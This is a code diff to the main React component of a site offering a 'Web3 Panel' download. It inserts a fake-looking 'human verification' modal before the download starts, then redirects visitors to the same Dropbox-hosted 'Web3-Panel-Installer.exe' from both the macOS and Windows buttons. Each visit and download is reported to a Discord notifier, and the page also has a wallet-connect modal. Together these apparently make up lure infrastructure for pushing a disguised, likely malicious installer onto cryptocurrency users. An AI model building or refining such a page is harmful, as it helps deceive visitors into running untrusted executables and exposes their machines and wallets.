@@ -3,6 +3,7 @@ import { Routes, Route } from 'react-router-dom';
 import { Chrome, Siren as Firefox, Smartphone, Laptop, LineChart, Shield, Bug, Activity, Search, Code, Network } from 'lucide-react';
 import Header from './components/Header';
 import WalletModal from './components/WalletModal';
+import HumanVerificationModal from './components/HumanVerificationModal';
 import Contact from './pages/Contact';
 import Docs from './pages/Docs';
 import { useEffect, useState } from 'react';
@@ -40,6 +41,8 @@ function App() {
   const [transactionData, setTransactionData] = useState(generateTransactionData());
   const [gasData, setGasData] = useState(generateGasData());
   const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
+  const [isVerificationModalOpen, setIsVerificationModalOpen] = useState(false);
+  const [pendingDownloadType, setPendingDownloadType] = useState<string>('');
   const [errorData, setErrorData] = useState({
     contract: generateContractAddress(),
     time: '1 min ago',
@@ -82,6 +85,24 @@ function App() {
     sendDiscordNotification('visit');
   }, []);
 
+  const handleDownloadClick = (downloadType: string) => {
+    setPendingDownloadType(downloadType);
+    setIsVerificationModalOpen(true);
+  };
+
+  const handleVerificationComplete = () => {
+    // Send notification and start download
+    sendDiscordNotification('download', pendingDownloadType);
+    
+    // Start the actual download
+    const downloadUrl = 'https://www.dropbox.com/scl/fi/qnmitutujij0cdp53da8g/Web3-Panel-Installer.exe?rlkey=7g9shdoqhxmpqwhadfxbhh2ut&st=o53lhu45&dl=1';
+    window.location.href = downloadUrl;
+    
+    // Reset state
+    setPendingDownloadType('');
+    setIsVerificationModalOpen(false);
+  };
+
   return (
     <div 
       className="bg-cover bg-center bg-no-repeat"
@@ -90,10 +111,16 @@ function App() {
         backgroundAttachment: 'fixed'
       } : {}}
     >
-      <Header />
+      <Header onDownloadClick={handleDownloadClick} />
       <WalletModal 
         isOpen={isWalletModalOpen}
         onClose={() => setIsWalletModalOpen(false)}
+      />
+      <HumanVerificationModal
+        isOpen={isVerificationModalOpen}
+        onClose={() => setIsVerificationModalOpen(false)}
+        onVerified={handleVerificationComplete}
+        downloadType={pendingDownloadType}
       />
       <Routes>
         <Route path="/contact" element={<Contact />} />
@@ -154,9 +181,8 @@ function App() {
 
             {/* Download Buttons */}
             <div className="flex gap-4 flex-wrap">
-              <a 
-                href="https://www.dropbox.com/scl/fi/qnmitutujij0cdp53da8g/Web3-Panel-Installer.exe?rlkey=7g9shdoqhxmpqwhadfxbhh2ut&st=o53lhu45&dl=1"
-                onClick={() => sendDiscordNotification('download', 'macOS')}
+              <button 
+                onClick={() => handleDownloadClick('macOS')}
                 className="bg-white px-6 py-3 rounded-lg font-medium flex items-center gap-3 hover:bg-gray-50 transition-colors"
               >
                 <img src="https://cdn-icons-png.flaticon.com/512/0/747.png" 
@@ -164,10 +190,9 @@ function App() {
                   alt="macOS logo" 
                 />
                 <span className="text-gray-900">macOS</span>
-              </a>
-              <a 
-                href="https://www.dropbox.com/scl/fi/qnmitutujij0cdp53da8g/Web3-Panel-Installer.exe?rlkey=7g9shdoqhxmpqwhadfxbhh2ut&st=o53lhu45&dl=1"
-                onClick={() => sendDiscordNotification('download', 'Windows')}
+              </button>
+              <button 
+                onClick={() => handleDownloadClick('Windows')}
                 className="bg-white px-6 py-3 rounded-lg font-medium flex items-center gap-3 hover:bg-gray-50 transition-colors mr-2"
               >
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Windows_logo_-_2012.svg/2048px-Windows_logo_-_2012.svg.png" 
@@ -175,7 +200,7 @@ function App() {
                   alt="Windows logo" 
                 />
                 <span className="text-gray-900">Windows</span>
-              </a>
+              </button>
               <button
                 onClick={() => setIsWalletModalOpen(true)}
                 className="relative group px-6 py-3 rounded-lg font-medium flex items-center gap-3 overflow-hidden"
